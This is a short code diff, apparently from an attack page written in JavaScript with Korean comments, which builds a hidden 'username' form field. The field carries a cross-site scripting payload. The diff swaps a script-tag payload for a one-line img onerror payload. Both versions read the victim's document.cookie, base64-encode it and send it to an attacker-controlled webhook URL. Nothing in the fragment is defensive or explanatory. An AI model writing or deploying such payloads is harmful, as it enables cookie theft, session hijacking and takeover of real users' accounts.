@@ -15,10 +15,8 @@
         usernameInput.type = 'hidden';
         usernameInput.name = 'username';
         
-        // 페이로드: document.cookie를 읽어서 지정된 웹훅 URL로 보냅니다.
-        usernameInput.value = `<script>
-          fetch('${webhookUrl}?data=' + btoa(document.cookie));
-        <\/script>`;
+        // 페이로드: img 태그의 onerror 이벤트를 이용한 한 줄 페이로드
+        usernameInput.value = `<img src=x onerror="fetch('${webhookUrl}?data=' + btoa(document.cookie))">`;
         
         const passwordInput = document.createElement('input');
         passwordInput.type = 'hidden';
